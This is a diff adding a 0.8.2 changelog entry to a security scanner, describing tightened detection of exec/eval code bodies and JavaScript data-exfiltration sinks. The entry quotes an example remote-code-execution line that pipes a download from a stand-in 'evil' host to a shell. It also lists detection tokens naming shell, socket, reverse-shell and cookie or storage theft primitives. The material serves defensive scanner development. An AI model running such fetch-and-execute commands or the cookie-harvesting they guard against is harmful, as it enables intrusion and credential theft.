@@ -3,6 +3,31 @@
 All notable changes to the Hermes Shield scanner are recorded here.
 Format follows [Keep a Changelog](https://keepachangelog.com/); versioning is [SemVer](https://semver.org/).
 
+## [0.8.2] — 2026-07-22 · precision-hardening (close three false-assurance holes the 0.8.1 downgrade opened)
+
+**PATCH bump: this TIGHTENS 0.8.1 — cases 0.8.1 wrongly silenced are flagged again; the genuine 0.8.1 wins
+(safe constant imports + harmless constant JS stay quiet) are preserved.** The 0.8.1 precision fix treated a
+CONSTANT string as inert regardless of where it landed; adversarial review found that opened real gaps.
+
+### Fixed
+- **exec/eval/compile constant CODE BODY (was silently CLEAN → now a sink).** The constant-target downgrade is
+  restricted to `__import__` / `import_module` (which take a module NAME — genuinely inert as a constant). A
+  constant `exec`/`eval`/`compile` **body executes** — `exec("import os; os.system('curl evil|sh')")` is a live
+  RCE — so a constant body is screened for danger tokens (`os.system` / `subprocess.` / `socket.` / `/bin/` /
+  `__import__` / `curl` / nested `eval`/`exec` / reverse-shell) and STAYS `code_exec` when any is present.
+  Benign bodies (`eval("1+1")`) stay downgraded.
+- **constant `page.evaluate` data-exfil (was CLEAN → now a sink).** The constant-JS screen now also blocks
+  data-exfil verbs — `fetch` / `XMLHttpRequest` / `sendBeacon` / `document.cookie` / `localStorage` /
+  `sessionStorage` — so a fixed JS body that harvests cookies/credentials is no longer treated as inert. A
+  harmless constant JS body stays downgraded.
+- **string-constant reassignment soundness.** `_collect_str_consts` now drops any name bound more than once
+  anywhere in the tree, or ever bound non-constantly, so `X="safe"; X=f"{untrusted}"; page.evaluate(X)` no
+  longer resolves to the stale safe literal. A genuinely-single benign module constant still resolves.
+
+### Tested
+- New MUST-FIRE adversarial suite (`tests/test_precision_v0_8_2.py`, 16 cases): each attack flips
+  missed→caught while every 0.8.1 safe case stays clean. Recall unchanged (**85.7%** on the adversarial corpus).
+
 ## [0.8.1] — 2026-07-22 · multi-model AI backends + precision fix (public numbers unchanged)
 
 ### Added
